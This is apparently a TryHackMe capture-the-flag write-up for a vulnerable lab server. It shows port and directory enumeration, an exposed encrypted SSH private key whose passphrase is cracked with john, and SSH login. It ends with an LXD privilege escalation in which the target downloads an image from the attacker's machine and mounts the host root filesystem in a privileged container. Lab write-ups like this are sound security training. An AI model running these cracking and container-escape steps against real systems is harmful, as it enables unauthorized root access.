A THM Room
By Sovren

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.


# Reconnaissance

The site is called House of danak
Draagan links to the homepage
username john mentioned in page source comments

john is in the sudo group


# Enumeration

### Nmap
--
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)

|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)

|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

|http-title: House of danak

Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.7 - 4.19 (92%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 3 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


### Gobuster
--
gobuster dir -u <target.ip> -w /usr/share/wordlists/dirb/common.txt

.hta                 (Status: 403) [Size: 277]

.htaccess            (Status: 403) [Size: 277]

.htpasswd            (Status: 403) [Size: 277]

index.html           (Status: 200) [Size: 2762]

robots.txt           (Status: 200) [Size: 33]

secret               (Status: 301) [Size: 313] [--> http://10.80.142.74/secret/]

server-status        (Status: 403) [Size: 277]

uploads              (Status: 301) [Size: 314] [--> http://10.80.142.74/uploads/]



robots.txt:
---
user-agent: *
Allow: /
/uploads/

/secret
---
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547


T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P

-----END RSA PRIVATE KEY-----


/uploads
---
dict.lst - password list
manifesto.txt  -  The Hacker Manifesto
meme.jpg  -  potential for steganography

# Exploitation

`$ ssh -i secretKey john@10.80.142.74`                
`** WARNING: connection is not using a post-quantum key exchange algorithm.`
`** This session may be vulnerable to "store now, decrypt later" attacks.`
`** The server may need to be upgraded. See https://openssh.com/pq[.]html`
`Enter passphrase for key 'secretKey':` 
`john@10.80.142.74's password:` 
`Permission denied, please try again.`
`john@10.80.142.74's password:` 
`Permission denied, please try again.`
`john@10.80.142.74's password:` 
`john@10.80.142.74: Permission denied (publickey,password).`

We need to find the password that is used with the private key. We will use the dict.lst file we found to break it. 

`ssh2john secretKey > key.hash`

`john --wordlist=dict.lst key.hash` 
`letmein          (secretKey)` 

`ssh -i secretKey john@10.80.142.74 -v` 

the password when prompted is letmein

Access via SSH has now been achieved. 

`cat user.txt`
`a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

We have access to the shell thanks for the private key, but we don't know john's password and cannot discover sudo privileges


# Privilege Escalation

sudo -l
we were unable to find john's sudo permissions due to not having his password. 

#### SUID Files
- /bin/mount
- /bin/umount
- /bin/su
- /bin/fusermount
- /bin/ping
- /usr/lib/eject/dmcrypt-get-device
- /usr/lib/snapd/snap-confine
- /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
- /usr/lib/openssh/ssh-keysign
- /usr/lib/dbus-1.0/dbus-daemon-launch-helper
- /usr/lib/policykit-1/polkit-agent-helper-1
- /usr/bin/chsh
- /usr/bin/newgidmap
- /usr/bin/traceroute6.iputils
- /usr/bin/sudo
- /usr/bin/passwd
- /usr/bin/gpasswd
- /usr/bin/chfn
- /usr/bin/at
- /usr/bin/pkexec
- /usr/bin/newgrp
- /usr/bin/newuidmap
- /snap/core/8268/bin/mount
- /snap/core/8268/bin/ping
- /snap/core/8268/bin/ping6
- /snap/core/8268/bin/su
- /snap/core/8268/bin/umount
- /snap/core/8268/usr/bin/chfn
- /snap/core/8268/usr/bin/chsh
- /snap/core/8268/usr/bin/gpasswd
- /snap/core/8268/usr/bin/newgrp
- /snap/core/8268/usr/bin/passwd
- /snap/core/8268/usr/bin/sudo
- /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
- /snap/core/8268/usr/lib/openssh/ssh-keysign
- /snap/core/8268/usr/lib/snapd/snap-confine
- /snap/core/8268/usr/sbin/pppd
- /snap/core/7270/bin/mount
- /snap/core/7270/bin/ping
- /snap/core/7270/bin/ping6
- /snap/core/7270/bin/su
- /snap/core/7270/bin/umount
- /snap/core/7270/usr/bin/chfn
- /snap/core/7270/usr/bin/chsh
- /snap/core/7270/usr/bin/gpasswd
- /snap/core/7270/usr/bin/newgrp
- /snap/core/7270/usr/bin/passwd
- /snap/core/7270/usr/bin/sudo
- /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
- /snap/core/7270/usr/lib/openssh/ssh-keysign
- /snap/core/7270/usr/lib/snapd/snap-confine
- /snap/core/7270/usr/sbin/pppd

#### Cronjobs
No custom jobs to exploit

#### User Enumeration
----
`id`
`uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)`

108 (lxd) 
Being part of the lxd group allows for the potential to break out as root. See the LXD exploit steps below.


### LXD Exploit
---

References:

https://www[.]exploit-db.com/exploits/46978

https://github[.]com/saghul/lxd-alpine-builder

On the attacking machine run:

`wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine`

`chmod +x build-alpine`

`sudo ./build-alpine`

`python -m http.server 8000`

Then from the victim's machine run:

`wget http://192.168.135.113:8000/alpine-v3.23-x86_64-20260213_1144.tar.gz`

`lxc image import alpine-v3.23-x86_64-20260213_1144.tar.gz --alias myimage`

`lxc image list`

`lxc init myimage ignite -c security.privileged=true`

`lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`

`lxc start ignite`

`lxc exec ignite /bin/sh`

After that, we have root access. 
The flag can be found at /mnt/root/root in the root.txt file
Flag:
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
